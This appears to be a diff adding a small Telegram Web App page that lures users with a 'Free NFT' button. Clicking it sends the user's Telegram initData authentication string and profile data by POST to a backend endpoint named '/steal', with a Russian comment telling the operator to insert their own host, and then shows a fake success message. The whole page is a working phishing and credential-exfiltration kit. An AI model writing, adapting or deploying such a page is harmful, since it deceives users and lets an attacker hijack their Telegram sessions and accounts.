@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free NFT Collector</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Collect Free NFT!</h1>
+    <p>Click the button below to get your free NFT.</p>
+    <button id="get-nft">Get NFT</button>
+
+    <script>
+        document.getElementById('get-nft').addEventListener('click', function() {
+            Telegram.WebApp.requestAccess('nft', function() {
+                const initData = Telegram.WebApp.initData;
+                const user = Telegram.WebApp.initDataUnsafe.user;
+
+                // Замените URL на ваш бэкенд на Amvera
+                fetch('https://YOUR_AMVERA_APP_URL/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: initData,
+                        user: user
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert('NFT successfully collected!');
+                    } else {
+                        alert('Error: ' + data.error);
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
